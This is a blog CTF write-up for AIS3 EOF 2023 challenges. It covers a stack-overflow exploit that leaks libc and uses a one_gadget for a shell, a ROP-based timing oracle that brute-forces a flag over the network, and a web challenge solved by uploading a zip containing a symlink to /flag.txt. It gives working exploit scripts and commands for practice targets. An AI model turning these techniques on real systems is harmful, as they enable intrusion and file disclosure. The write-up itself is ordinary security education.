<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  AIS3 EOF 2023 初賽
  #


  PWN
  #


  real_rop
  #


  Description
  #



Challenge URL


Folder structure:
Share
├── share
│   ├── chal
│   ├── flag
│   ├── Makefile
│   ├── real_rop++.c
│   └── run.sh
├── docker-compose.yaml
├── Dockerfile
└── xinetd



  Original Code
  #

#include <unistd.h>

int main()
{
    char buf[0x10];

    read(0, buf, 0x30);
    write(1, buf, 0x30);
    
    return 0;
}
gcc -fno-stack-protector -o chal real_rop++.c

Obviously buffer overflow but not much
Preliminary idea is one_gadget
Check protector
$ checksec chal
[*] &#39;/home/sbk6401/CTF/AIS3/PWN/real_rop/share/chal&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

PIE is enabled → use write function to leak libc address
Full RELRO → cannot use GOT hijacking
Refer to 大神write up, we cannot leak libc address and get shell at one time. So, we can control $rip and return to the beginning of main function and go through the process again. That is, we have another read function to fill in one_gadget.
Note that, the version of Ubuntu and Glibc is VERY VERY important, according to Dockerfile, it seems use Ubuntu 20.04 with default
FROM ubuntu:20.04
MAINTAINER u1f383

RUN apt-get update && \
    DEBAIN_FRONTEND=noninteractive apt-get install -qy xinetd

RUN useradd -m chal
RUN chown -R root:root /home/chal
RUN chmod -R 755 /home/chal

CMD ["/usr/sbin/xinetd", "-dontfork"]



  Analyze where to return
  #



For Ubuntu 22.04 &　GLIBC 2.35 - back to __libc_start_main+121'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/competition/ais3-eof-2023-%E5%88%9D%E8%B3%BD/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="AIS3 EOF 2023 初賽"><meta property="og:description" content='AIS3 EOF 2023 初賽 # PWN # real_rop # Description # Challenge URL
Folder structure:
Share ├── share │ ├── chal │ ├── flag │ ├── Makefile │ ├── real_rop++.c │ └── run.sh ├── docker-compose.yaml ├── Dockerfile └── xinetd Original Code # #include <unistd.h> int main() { char buf[0x10]; read(0, buf, 0x30); write(1, buf, 0x30); return 0; } gcc -fno-stack-protector -o chal real_rop++.c Obviously buffer overflow but not much Preliminary idea is one_gadget Check protector $ checksec chal [*] &#39;/home/sbk6401/CTF/AIS3/PWN/real_rop/share/chal&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled PIE is enabled → use write function to leak libc address Full RELRO → cannot use GOT hijacking Refer to 大神write up, we cannot leak libc address and get shell at one time. So, we can control $rip and return to the beginning of main function and go through the process again. That is, we have another read function to fill in one_gadget. Note that, the version of Ubuntu and Glibc is VERY VERY important, according to Dockerfile, it seems use Ubuntu 20.04 with default FROM ubuntu:20.04 MAINTAINER u1f383 RUN apt-get update && \ DEBAIN_FRONTEND=noninteractive apt-get install -qy xinetd RUN useradd -m chal RUN chown -R root:root /home/chal RUN chmod -R 755 /home/chal CMD ["/usr/sbin/xinetd", "-dontfork"] Analyze where to return # For Ubuntu 22.04 &　GLIBC 2.35 - back to __libc_start_main+121'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="CTF"><meta property="article:tag" content="AIS3"><title>AIS3 EOF 2023 初賽 | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/competition/ais3-eof-2023-%E5%88%9D%E8%B3%BD/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>AIS3 EOF 2023 初賽</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#pwn>PWN</a><ul><li><a href=#real_rop>real_rop</a></li><li><a href=#overall-the-sequence-is>Overall, the sequence is:</a></li><li><a href=#overall-the-sequence-is-1>Overall, the sequence is:</a></li><li><a href=#how2know_revenge>how2know_revenge</a></li></ul></li><li><a href=#web>Web</a><ul><li><a href=#share>Share</a></li></ul></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=ais3-eof-2023-初賽>AIS3 EOF 2023 初賽
<a class=anchor href=#ais3-eof-2023-%e5%88%9d%e8%b3%bd>#</a></h1><h2 id=pwn>PWN
<a class=anchor href=#pwn>#</a></h2><h3 id=real_rop>real_rop
<a class=anchor href=#real_rop>#</a></h3><h4 id=description>Description
<a class=anchor href=#description>#</a></h4><ul><li><p>Challenge <a href=https://share.ctf.zoolab.org/>URL</a></p></li><li><p>Folder structure:</p><pre tabindex=0><code>Share
├── share
│   ├── chal
│   ├── flag
│   ├── Makefile
│   ├── real_rop++.c
│   └── run.sh
├── docker-compose.yaml
├── Dockerfile
└── xinetd
</code></pre></li></ul><h4 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h4><pre tabindex=0><code class=language-cpp! data-lang=cpp!>#include &lt;unistd.h&gt;

int main()
{
    char buf[0x10];

    read(0, buf, 0x30);
    write(1, buf, 0x30);
    
    return 0;
}
</code></pre><pre tabindex=0><code class=language-make! data-lang=make!>gcc -fno-stack-protector -o chal real_rop++.c
</code></pre><ul><li>Obviously buffer overflow but not much</li><li>Preliminary idea is <code>one_gadget</code></li><li>Check protector<pre tabindex=0><code class=language-bash! data-lang=bash!>$ checksec chal
[*] &#39;/home/sbk6401/CTF/AIS3/PWN/real_rop/share/chal&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre></li><li><code>PIE</code> is enabled → use write function to leak <code>libc</code> address</li><li><code>Full RELRO</code> → cannot use <code>GOT hijacking</code></li><li>Refer to <a href=https://hackmd.io/Prmz9YuOQsiHGXrTuYMzFw?view#Real_rop>大神write up</a>, we cannot leak <code>libc</code> address and get shell at one time. So, we can control <code>$rip</code> and return to the beginning of <code>main</code> function and go through the process again. That is, <font color=FF0000>we have another <code>read</code> function</font> to fill in <code>one_gadget</code>.</li><li>Note that, <strong>the version of Ubuntu and Glibc is VERY VERY important</strong>, according to <code>Dockerfile</code>, it seems use Ubuntu 20.04 with default<pre tabindex=0><code class=language-dockerfile! data-lang=dockerfile!>FROM ubuntu:20.04
MAINTAINER u1f383

RUN apt-get update &amp;&amp; \
    DEBAIN_FRONTEND=noninteractive apt-get install -qy xinetd

RUN useradd -m chal
RUN chown -R root:root /home/chal
RUN chmod -R 755 /home/chal

CMD [&#34;/usr/sbin/xinetd&#34;, &#34;-dontfork&#34;]
</code></pre></li></ul><h4 id=analyze-where-to-return>Analyze where to return
<a class=anchor href=#analyze-where-to-return>#</a></h4><ul><li><p><font color=FF0000><strong><code>For Ubuntu 22.04 &　GLIBC 2.35</code> - back to <code>__libc_start_main+121</code></strong></font></p><pre tabindex=0><code class=language-bash! data-lang=bash!>$ gdb chal
pwndbg&gt; starti
pwndbg&gt; vmmap
</code></pre><p><img src=https://imgur.com/gZjkjR0.png alt></p><pre tabindex=0><code class=language-bash! data-lang=bash!>pwndbg&gt; b _start
Breakpoint 15 at 0x555555555080 (2 locations)
pwndbg&gt; c
</code></pre><p><img src=https://imgur.com/T7ZR1or.png alt></p><pre tabindex=0><code class=language-bash! data-lang=bash!>pwndbg&gt; pwndbg&gt; b __libc_start_main
Breakpoint 16 at 0x7ffff7db8dc0: file ../csu/libc-start.c, line 242.
pwndbg&gt; c
pwndbg&gt; ni    # until &lt;__libc_start_main+123&gt;
</code></pre><p><img src=https://imgur.com/mts1hQW.png alt></p><pre tabindex=0><code class=language-bash! data-lang=bash!>pwndbg&gt; s
pwndbg&gt; ni    # until &lt;__libc_start_main+123&gt;
</code></pre><p><img src=https://imgur.com/iht55Ot.png alt></p><pre tabindex=0><code class=language-bash! data-lang=bash!>pwndbg&gt; s
</code></pre><p><img src=https://imgur.com/9V30ok9.png alt></p><pre tabindex=0><code class=language-bash! data-lang=bash!>pwndbg&gt; ni    # until &lt;main+62&gt;
</code></pre><p><img src=https://imgur.com/IxTG2nC.png alt></p><h3 id=overall-the-sequence-is>Overall, the sequence is:
<a class=anchor href=#overall-the-sequence-is>#</a></h3><pre tabindex=0><code class=language-bash! data-lang=bash!>_start → 0x0000555555555080
__libc_start_main+123 → 0x00007ffff7db8e3b
__libc_start_call_main+126 → 0x00007ffff7db8d8e
</code></pre><pre tabindex=0><code class=language-bash! data-lang=bash!>_start
...
_start+31
↓
    __libc_start_main
    ...
    __libc_start_main+123
    ↓
        __libc_start_call_main
        ...
        __libc_start_call_main+126
        ↓
            main
            ...
        __libc_start_call_main+128
        __libc_start_call_main+130
        ↓
            exit
</code></pre></li><li><p><font color=FF0000><strong><code>For Ubuntu 20.04 &　GLIBC 2.31</code> - back to <code>__libc_start_main+236</code></strong></font>
Whole processes are almost the same as above, just the sequence is different</p><h3 id=overall-the-sequence-is-1>Overall, the sequence is:
<a class=anchor href=#overall-the-sequence-is-1>#</a></h3><pre tabindex=0><code class=language-bash! data-lang=bash!>_start
...
_start+40
↓
    __libc_start_main
    ...
    __libc_start_main+241
    ↓
        main
        ...
    __libc_start_main+243
    __libc_start_main+245
    ↓
        exit
</code></pre><p><img src=https://imgur.com/kemHGjG.png alt></p></li></ul><h4 id=exploit---leak-libc-address--one_gadget>Exploit - leak <code>libc</code> address + one_gadget
<a class=anchor href=#exploit---leak-libc-address--one_gadget>#</a></h4><p><font color=FF0000>Use Ubuntu 20.04 that the same as remote server</font></p><ol><li><p>Try to control <code>$rip</code> and return to beginning
We can observe stack at the end of <code>main</code> function. It&rsquo;ll always return to <code>__libc_start_main+243</code>. Therefore, we can padding garbage bytes and overlap the last byte of <code>$rip</code>.
<img src=https://imgur.com/qwhZ1qq.png alt></p><pre tabindex=0><code class=language-python! data-lang=python!>payload = p64(0) * 3 + int.to_bytes(124, 1, &#39;little&#39;)
</code></pre><p>According to the derivation of last section, we should return to <code>__libc_start_main+236</code>(the address is <code>0x7ffff7df007c</code> for temp) and the address of <code>__libc_start_main+243</code> is <code>0x7ffff7df0083</code>(temp), so that we just modify the last bytes → $0x73=124$
<img src=https://imgur.com/y4TJSWo.png alt></p></li><li><p>Try to leak <code>libc</code> offset - <code>write</code> function + <code>gdb</code>
We can observe stack situation before sending payload. The first 3*8 bytes are garbage bytes that we filled at first round.
<img src=https://imgur.com/Dm0nZBn.png alt></p><pre tabindex=0><code class=language-python! data-lang=python!>r.recv(0x18)
libc_addr = u64(r.recv(6) + b&#39;\x00\x00&#39;) - 0x24083 + 0x7
</code></pre><p>Skip garbage bytes first then receive 6 bytes. Note that <code>- 0x24083 + 0x7</code> is try and error so that it can be <code>0x7f07a24fb00</code>(temp) checked by <code>vmmap</code>.
<img src=https://imgur.com/igQeoUJ.png alt></p></li><li><p>Construct <code>one_gadget</code>
Use <code>vmmap</code> to check which <code>libc</code> version be used - <font color=FF0000><code>/lib/x86_64-linux-gnu/libc-2.31.so</code></font>
<img src=https://imgur.com/2hTs3o4.png alt></p><pre tabindex=0><code class=language-bash! data-lang=bash!>$ one_gadget /lib/x86_64-linux-gnu/libc-2.31.so
...
0xe3afe execve(&#34;/bin/sh&#34;, r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL
...
$ ROPgadget --binary /lib/x86_64-linux-gnu/libc-2.31.so --only &#34;pop|ret&#34; --multibr &gt; one_gadget
$ vim one_gadget
</code></pre><pre tabindex=0><code class=language-python! data-lang=python!>pop_r15_ret = libc_addr + 0x2a3e4
pop_r12_ret = libc_addr + 0x2f709
r.send(p64(0) * 3 + p64(pop_r12_ret) + p64(0) + p64(libc_addr+0xe3afe))
</code></pre><p><font color=FF0000>Note that</font> <code>$r15</code> has NULL already before <code>read</code> function, so it&rsquo;s no need to send <code>pop_r15_ret</code>.
<img src=https://imgur.com/SK0U7Mn.png alt></p></li><li><p>Then we got shell!!!
<img src=https://imgur.com/3zRhmUG.png alt></p></li></ol><h4 id=reference>Reference
<a class=anchor href=#reference>#</a></h4><p><a href=https://lu-yi-hsun.github.io/posts/reverse/gdb/#dwarf>gdb指令</a>
<a href=http://wen00072.github.io/blog/2015/02/14/main-linux-whos-going-to-call-in-c-language/>Linux中誰來呼叫C語言中的main?</a>
<a href=https://www.runoob.com/docker/docker-exec-command.html>Docker exec 命令</a></p><h3 id=how2know_revenge>how2know_revenge
<a class=anchor href=#how2know_revenge>#</a></h3><h4 id=description-1>Description
<a class=anchor href=#description-1>#</a></h4><ul><li>Challenge: <code>nc edu-ctf.zoolab.org 10012</code></li><li>Environment Version: Ubuntu 20.04</li><li>Folder structure:<pre tabindex=0><code>Share
├── share
│   ├── chal
│   ├── flag
│   ├── Makefile
│   ├── how2know_revenge.c
│   └── run.sh
├── docker-compose.yaml
├── Dockerfile
└── xinetd
</code></pre></li></ul><h4 id=original-code-1>Original Code
<a class=anchor href=#original-code-1>#</a></h4><pre tabindex=0><code class="language-cpp!=" data-lang="cpp!=">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;seccomp.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;stdlib.h&gt;

static char flag[0x30];

int main()
{
    char addr[0x10];
    int fd;
    scmp_filter_ctx ctx;

    fd = open(&#34;/home/chal/flag&#34;, O_RDONLY);
    if (fd == -1)
        perror(&#34;open&#34;), exit(1);
    read(fd, flag, 0x30);
    close(fd);

    write(1, &#34;talk is cheap, show me the rop\n&#34;, 31);
    read(0, addr, 0x1000);

    ctx = seccomp_init(SCMP_ACT_KILL);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
    seccomp_load(ctx);
    seccomp_release(ctx);

    return 0;
    
}
</code></pre><pre tabindex=0><code class=language-bash! data-lang=bash!>$ gcc -static -fno-stack-protector -o chal how2know_revenge.c -lseccomp
$  checksec chal
[*] &#39;/home/sbk6401/CTF/AIS3/PWN/how2know_revenge/share/chal&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre><h5 id=description--preliminary-idea>Description & Preliminary Idea
<a class=anchor href=#description--preliminary-idea>#</a></h5><p>The whole process flow is almost the same as <a href=/jHf3sAfOTveOIguRGXXmwQ>how2know</a>. The difference is global variable turned into local variable and it has buffer overflow obviously. So, we can find various <code>ROP</code> and access into it and brute force to compare the single char of the flag.</p><h4 id=exploit---rop--how2know>Exploit - <code>ROP</code> + <a href=/jHf3sAfOTveOIguRGXXmwQ>how2know</a>
<a class=anchor href=#exploit---rop--how2know>#</a></h4><ol><li>Find <code>flag</code> address → <font color=FF0000><code>0x4de2e0</code></font><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ objdump -d -M Intel chal | grep <span style=color:#e6db74>&#34;&lt;flag&gt;&#34;</span>
</span></span><span style=display:flex><span>  401cfe:       <span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>35</span> db c5 0d <span style=color:#ae81ff>00</span>    lea    0xdc5db<span style=color:#f92672>(</span>%rip<span style=color:#f92672>)</span>,%rsi        <span style=color:#75715e># 4de2e0 &lt;flag&gt;</span>
</span></span></code></pre></div></li><li>Create <code>ROP</code> chain<pre tabindex=0><code class=language-bash! data-lang=bash!>$ ROPgadget --binary chal --multibr &gt; rop_gadget
$ vim rop_gadget
</code></pre><pre tabindex=0><code class=language-python! data-lang=python!>pop_r14_ret = 0x402797
mov_eax_dword_ptr_rax_ret = 0x4022ee
cmp_al_r14b_ret = 0x438c15
jne_0x426148_ret = 0x426159

pop_rbx_ret = 0x401fa2
jmp_rbx = 0x4176fd
infinite_loop = p64(pop_rbx_ret) + p64(jmp_rbx) + p64(jmp_rbx)

ROP = flat(
            pop_rax_ret, flag_addr+idx,
            mov_eax_dword_ptr_rax_ret,
            pop_r14_ret, guess,
            cmp_al_r14b_ret, 
            jne_0x426148_ret,
)
ROP += infinite_loop
</code></pre><ul><li>Move the flag address to <code>$rax</code>, and move the flag string to <code>$eax</code> next</li><li>Then put our guess single char to <code>$r14</code></li><li>Compare <code>$al</code> and <code>$r14b</code></li><li>If correct, go into infinity loop, otherwise, jump to <code>0x426148</code></li></ul></li><li><strong>How to know the single char in pwntool side?</strong>
When the comparison is correct, it&rsquo;ll access into infinity loop and <code>recv</code> function will receive something then break while loop and close the connection, otherwise, it&rsquo;ll jump to <code>0x426148</code> and trigger timeout exception.<pre tabindex=0><code class=language-python! data-lang=python!>r.sendafter(b&#39;rop\n&#39;,b&#39;a&#39;*0x28 + ROP)
try :
    # If compare not correct, guess++ and access to infinity loop
    r.recv(timeout=0.5)
    break
except:
    # If compare correct, pwntool will break out
    guess += 1
r.close()
</code></pre></li><li>Repeat<pre tabindex=0><code class=language-python! data-lang=python!>flag = &#39;&#39;
idx = 0
while idx &lt; 48:
    guess = 0x20
    while guess &lt; 0x80 :
        r = remote(&#39;edu-ctf.zoolab.org&#39;, 10012)
        {create ROP}
        r.sendafter(b&#39;rop\n&#39;,b&#39;a&#39;*0x28 + ROP)
        try :
            ...
        except:
            ...
        r.close()
    idx += 1
    flag += chr(guess)
</code></pre></li></ol><ul><li>Whole exploit<pre tabindex=0><code class="language-python!=" data-lang="python!=">from pwn import *

context.arch = &#39;amd64&#39;

flag_addr = 0x4de2e0
pop_r14_ret = 0x402797
mov_eax_dword_ptr_rax_ret = 0x4022ee
cmp_al_r14b_ret = 0x438c15
jne_0x426148_ret = 0x426159

pop_rbx_ret = 0x401fa2
jmp_rbx = 0x4176fd
infinite_loop = p64(pop_rbx_ret) + p64(jmp_rbx) + p64(jmp_rbx)

flag = &#39;&#39;
idx = 0
while idx &lt; 53:
    guess = 0x20
    while guess &lt; 0x80 :
        # r = process(&#39;./chal&#39;)
        r = remote(&#39;edu-ctf.zoolab.org&#39;, 10012)
        ROP = flat(
            pop_rax_ret, flag_addr+idx,
            mov_eax_dword_ptr_rax_ret,
            pop_r14_ret, guess,
            cmp_al_r14b_ret, 
            jne_0x426148_ret,
        )
        ROP += infinite_loop

        r.sendafter(b&#39;rop\n&#39;,b&#39;a&#39;*0x28 + ROP)
        try :
            # If compare not correct, guess++ and access to infinity loop
            r.recv(timeout=0.5)
            break
        except:
            # If compare correct, pwntool will break out
            guess += 1
        r.close()

    idx += 1
    flag += chr(guess)
    print(flag)
print(flag)

r.interactive()
</code></pre><ul><li><font color=FF0000>Note that</font>: The exploit program will be affected by the internet connection and caused the result is wrong like this:</li></ul><pre tabindex=0><code>FLA!{CORORO_f8b7d5d23ad03512P6687384b7a2a/00}
&#39;LAG{CORORO_f8b7d5d23ad03512d6687384b7a2a500}
*LAG{C*RORO_f8b7d5d23ad03512d6687384b7a2a500}
FLAG{CO#/RO_f8b7d5d23ad03512d6687384b7a2a500}
FLAG{CAMORO_f8b7d5d/3ad03512d6687384!7a2a500xX
</code></pre>Thus, you can run much more times to compare the result together so that you can patch up the flag correctly.</li></ul><h4 id=reference-1>Reference
<a class=anchor href=#reference-1>#</a></h4><p><a href=/SkxNKJBqi#how2_know_revenge>EOF 2023</a></p><h2 id=web>Web
<a class=anchor href=#web>#</a></h2><h3 id=share>Share
<a class=anchor href=#share>#</a></h3><h4 id=description-2>Description
<a class=anchor href=#description-2>#</a></h4><ul><li><p>Challenge <a href=https://share.ctf.zoolab.org/>URL</a></p></li><li><p>Folder structure:</p><pre tabindex=0><code>Share
├── Web
│   ├── src
│   │   ├── static
│   │   │    └── {None}
│   │   ├── template
│   │   │    ├── index.html
│   │   │    └── login.html
│   │   └── app.py
│   └── Dockerfile
├── docker-compose.yaml
└── flag
</code></pre></li><li><p>This website function is let the user can upload compress folder <font color=FF0000>(*.zip)</font> and the compress folder must contains a <font color=FF0000><code>index.html</code></font> file so that it can uncompress the folder then redirect to this new page.</p></li><li><p>To solve this question, we must use <a href=https://youtu.be/jdZsO2GAf2I><font color=FF0000><strong><code>symbolic link</code></strong></font></a></p></li></ul><h4 id=observation>Observation
<a class=anchor href=#observation>#</a></h4><ul><li>Main program first - <strong><code>app.py</code></strong>
This part is aim to unzip the compress folder and redirect to new page - <code>index.html</code> that the user provide<pre tabindex=0><code class=language-python! data-lang=python!>...
@app.route(&#39;/upload&#39;, methods=[&#39;POST&#39;])
def upload_file():
  if &#39;user&#39; not in session:
    return &#39;Login first&#39;
  if &#39;file&#39; not in request.files or not request.files[&#39;file&#39;].filename:
    return &#39;Missing file&#39;

  _sub = session[&#39;user&#39;]
  file = request.files[&#39;file&#39;]
  tmppath = path.join(&#39;/tmp&#39;, urandom(16).hex())
  realpath = safeJoin(&#39;/app/static&#39;, _sub)
  if not realpath:
    return &#39;No path traversal&#39;
  if not path.exists(realpath):
    mkdir(realpath)

  file.save(tmppath)
  returncode = run([&#39;unzip&#39;, &#39;-qo&#39;, tmppath, &#39;-d&#39;, realpath]).returncode
  if returncode != 0:
    return &#39;Not a zip file&#39;
  if not path.isfile(path.join(realpath, &#39;index.html&#39;)):
    return &#39;&#34;index.html&#34; not found&#39;
  return redirect(realpath[4:]+&#39;/index.html&#39;, code=302)
...
</code></pre></li><li><strong><code>docker-compose.yaml</code></strong>
We can see that the flag is mounted on <font color=FF0000><code>/flag.txt</code></font><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-docker data-lang=docker><span style=display:flex><span>version: <span style=color:#e6db74>&#39;3.9&#39;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>services:<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  web:<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>    build: web<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>    restart: always<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>    ports:<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>      - 8080:5000<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>    volumes:<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>      - ./flag:/flag.txt:ro<span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div></li></ul><h4 id=construct-payload>Construct Payload
<a class=anchor href=#construct-payload>#</a></h4><ul><li><p>So, our first idea is using symbolic link to create a <code>payload.txt</code> that link to <code>/flag.txt</code> and compress with <code>index.html</code> then upload to the web page.</p></li><li><p>Payload</p><pre tabindex=0><code class=language-bash! data-lang=bash!>touch index.html
ln -s /flag.txt payload.txt
zip --symlinks -ry index.zip payload.txt index.html
</code></pre><p>Then rewrite the URL like this: <a href=https://share.ctf.zoolab.org/static/123/payload.txt>https://share.ctf.zoolab.org/static/123/payload.txt</a></p><p><font color=FF0000>FLAG{w0W_y0U_r34L1y_kn0w_sYmL1nK!}</font></p></li></ul><h4 id=reference-2>Reference
<a class=anchor href=#reference-2>#</a></h4><p><a href=https://ctftime.org/writeup/31867>unzipper-ctftime</a>
<a href=https://mikecat.github.io/ctf-writeups/2021/20211218_hxp_CTF_2021/WEB/unzipper/#en>unzipper-mikecat</a>
<a href=https://nandynarwhals.org/hxp-ctf-2021-unzipper/>unzipper-nandynarwhals</a>
<a href=https://www.techbang.com/posts/12538-hard-links-soft-links-archives-does-not-fashu>電腦王-symbolic link</a>
<a href=https://ithelp.ithome.com.tw/articles/10222754>Ithelp - symbolic link</a></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#pwn>PWN</a><ul><li><a href=#real_rop>real_rop</a></li><li><a href=#overall-the-sequence-is>Overall, the sequence is:</a></li><li><a href=#overall-the-sequence-is-1>Overall, the sequence is:</a></li><li><a href=#how2know_revenge>how2know_revenge</a></li></ul></li><li><a href=#web>Web</a><ul><li><a href=#share>Share</a></li></ul></li></ul></nav></div></aside></main></body></html>